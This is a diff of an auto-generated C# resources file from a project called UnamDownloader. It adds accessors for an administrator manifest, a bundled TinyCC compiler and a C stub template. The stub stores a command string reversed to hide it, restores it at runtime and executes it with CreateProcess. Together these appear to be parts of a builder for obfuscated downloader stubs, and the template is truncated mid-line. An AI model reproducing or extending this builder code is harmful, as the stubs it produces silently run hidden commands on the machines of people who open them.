@@ -61,6 +61,26 @@ namespace UnamDownloader.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] administrator {
+            get {
+                object obj = ResourceManager.GetObject("administrator", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] manifest {
+            get {
+                object obj = ResourceManager.GetObject("manifest", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
         internal static System.Drawing.Bitmap microsoft_admin {
@@ -89,11 +109,52 @@ namespace UnamDownloader.Properties {
         ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
         ///[assembly: AssemblyProduct(&quot;%Product%&quot;)]
         ///[assembly: AssemblyCopyright(&quot;%Copyright%&quot;)]
-        ///[assembly: AssemblyTrademark(&quot;%Tradema [rest of string was truncated]&quot;;.
+        ///[assembly: AssemblyTrademark(&quot;%Trademark%&quot;) [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Program {
             get {
                 return ResourceManager.GetString("Program", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
+        ///
+        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
+        ///
+        ///void inplace_rev( char * s ) {
+        ///  char t, *e = s + strlen(s);
+        ///  while ( --e &gt; s ) { t = *s;*s++=*e;*e=t; }
+        ///}
+        ///
+        ///int main(int argc, char **argv) 
+        ///{
+        ///	  PROCESS_INFORMATION p_info;
+        ///	  STARTUPINFO s_info;
+        ///
+        ///	  memset(&amp;s_info, 0, sizeof(s_info));
+        ///	  memset(&amp;p_info, 0, sizeof(p_info));
+        ///	  s_info.cb = sizeof(s_info);
+        ///	  
+        ///	  char commands[] = &quot;#COMMAND&quot;;
+        ///	  
+        ///	  inplace_rev(commands);
+        ///
+        ///	  if (CreateProcess(NULL, commands, NULL, NULL, FA [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string Program1 {
+            get {
+                return ResourceManager.GetString("Program1", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] tinycc {
+            get {
+                object obj = ResourceManager.GetObject("tinycc", resourceCulture);
+                return ((byte[])(obj));
             }
         }
     }
